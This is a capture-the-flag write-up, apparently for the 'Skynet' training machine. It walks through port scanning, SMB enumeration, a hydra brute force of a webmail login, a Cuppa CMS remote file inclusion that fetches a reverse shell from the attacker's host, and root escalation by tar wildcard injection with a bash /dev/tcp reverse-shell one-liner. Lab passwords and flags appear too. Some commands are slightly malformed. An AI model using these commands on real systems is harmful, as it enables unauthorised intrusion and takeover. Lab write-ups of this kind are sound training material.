#### 1. Scanning

```
nmap -Pn -A 10.10.59.157                   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 05:24 EST
Nmap scan report for 10.10.59.157
Host is up (0.20s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE TOP RESP-CODES PIPELINING CAPA UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ IMAP4rev1 ENABLE more have post-login capabilities OK ID LOGINDISABLEDA0001 listed LOGIN-REFERRALS IDLE Pre-login SASL-IR
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-02-03T04:24:49-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-03T10:24:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.97 seconds
```


#### 2. Gobuster

```
gobuster dir -u http://10.10.59.157   -w /usr/share/wordlists/dirb/common.txt -e php,txt,html         
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.59.157
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/03 05:24:38 Starting gobuster
===============================================================
http://10.10.59.157/.htaccess (Status: 403)
http://10.10.59.157/.htpasswd (Status: 403)
http://10.10.59.157/.hta (Status: 403)
http://10.10.59.157/admin (Status: 301)
http://10.10.59.157/config (Status: 301)
http://10.10.59.157/css (Status: 301)
http://10.10.59.157/index.html (Status: 200)
http://10.10.59.157/js (Status: 301)
http://10.10.59.157/server-status (Status: 403)
http://10.10.59.157/squirrelmail (Status: 301)
===============================================================
2021/02/03 05:26:49 Finished
===============================================================
```

The most interesting directory is `/admin`



#### 3. Running enum4linux

I run enum4linux as there is Samba running on machine and get a list of shares. 


```
 ======================================
|    Shares via RPC on 10.10.59.157    |
 ======================================
[*] Enumerating shares
[+] Found 4 share(s):
IPC$:
  comment: IPC Service (skynet server (Samba, Ubuntu))
  type: IPC
anonymous:
  comment: Skynet Anonymous Share
  type: Disk
milesdyson:
  comment: Miles Dyson Personal Share
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share anonymous
[+] Mapping: OK, Listing: OK
[*] Testing share milesdyson
[+] Mapping: DENIED, Listing: N/A
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A
```

There is `anonymous` accessible for everyone: so:

`mbclient //10.10.59.157/anonymous`

I find and download attention.txt file and three also three og files in `/logs` directory

`attention.txt` says that everyone should modify their password immediately after reading the note.

`log1.txt` is most likely list of passwords possible to bruteforce with user `milesdyson`

```
cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```


#### 4. Accesing /squirrelmail

I launch hydra to bruteforce password of `milesdyson` and using `log1.txt` as a dictionary:

`hydra -l milesdyson -P log1.txt 10.10.59.157 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -v`

After few minutes, I have a password.

`[80][http-post-form] host: 10.10.59.157   login: milesdyson   password: cyborg007haloterminator`



#### 5. Exploring mail platform

First mail is from skynet@skynet:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

So we got password of `milesdyson` share:

Second mail is from  serenakogan@skynet

```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

After conversion from binary to ascii gives:

```
balls have zero to me to me to me to me to me to me to me to me to
```

Third mail is also from serenakogan@skynet

```


i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```
There are no other mails, I also tried to get shell with netcat (typing commands in search fields  but nothing worked). Second and third mail are rabbit holes.



#### 6. Logging to milesdyson share

I run this command:

`smbclient -U milesdyson //10.10.67.236/milesdyson`

and am in.

Inside there is a directory  called `notes` and there we find `important.txt`:

```
smbclient -U milesdyson //10.10.59.157/milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

		9204224 blocks of size 1024. 5830508 blocks available
smb: \> get notes
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \notes
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

		9204224 blocks of size 1024. 5830508 blocks available

smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \notes\> 
```

Inside I find some useful informations:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

So there is a secret website.



#### 7. Enumerating /45kra24zxs28v3yd

I run once again gobuster and it find another hidden directory `/administrator` with Cuppa CMS

```
gobuster dir -u 10.10.59.157/45kra24zxs28v3yd/   -w /usr/share/wordlists/dirb/common.txt -e php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.59.157/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/03 07:04:25 Starting gobuster
===============================================================
http://10.10.59.157/45kra24zxs28v3yd/.hta (Status: 403)
http://10.10.59.157/45kra24zxs28v3yd/.htaccess (Status: 403)
http://10.10.59.157/45kra24zxs28v3yd/.htpasswd (Status: 403)
http://10.10.59.157/45kra24zxs28v3yd/administrator (Status: 301)
http://10.10.59.157/45kra24zxs28v3yd/index.html (Status: 200)
===============================================================
2021/02/03 07:06:41 Finished
===============================================================
 ```


#### 8. Cuppa CMS

I typed 'cuppa cms exploit" on google and found:

`https://www.exploit-db.com/exploits/25971`

This vulnerability is called Remote file intrusion attack. In our case, we  can read any file on machine or run a reverse shell, by adding it in the end of execution command.

Command used here is:

`curl -s http://10.10.59.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=`



Here is my approach:

1. I prepared pentest monkey's reverse shell script

2. Enabled it with python `python3 -m http.server`

3. Ran netcat `sudo nc -lvnp 4444`

4. Executed RFI command adding link to shared script, so finally:

`curl -s http://10.10.59.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.46.150:8000/revshell.php`

and here we are on machine,, logged as `www-data`

```
connect to [10.6.46.150] from (UNKNOWN) [10.10.59.157] 51582
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 06:26:30 up  2:04,  0 users,  load average: 0.14, 0.08, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```


#### 9. Enumeration of machine

Firstly I spawn shell:

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

It turns out that `www-data` can read `milesdyson` user.txt flag so I do it:

```
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5c2109a40f958099283600a9ae807
```

I checked `sudo-l` but it asks me for password. I also couldn't find any suid files, however in `milesdyson` home there is a backup script:

```
www-data@skynet:/home/milesdyson$ ls -l
ls -l
total 16
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cd backups
cd backups
www-data@skynet:/home/milesdyson/backups$ ls -la
ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Jun 10 11:44 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ 
```

so according to GTFO Bins  it is possible to use `tar` to become root

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/`

as `backup.sh` runs as cron job every minute:

```
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 * * * *   root  /home/milesdyson/backups/backup.sh
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson/backups$ 
```

Let's create a script with reverse shell oneliner inside and run netcat in other terminal.

Here are commands to execute step by step:

`printf '#!/bin/bash\nbash -i >& /dev/tcp/10.6.46.150 4444 0>&1' > /var/www/html/shell`

`chmod +x /var/www/html/shell`

`touch /var/www/html/--checkpoint=1`

`touch /var/www/html/--checkpoint-action=exec=bash\ shell`


After one minute, we become root and read a flag:

```
root@skynet:/var/www/html# cat /root/root.txt
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```

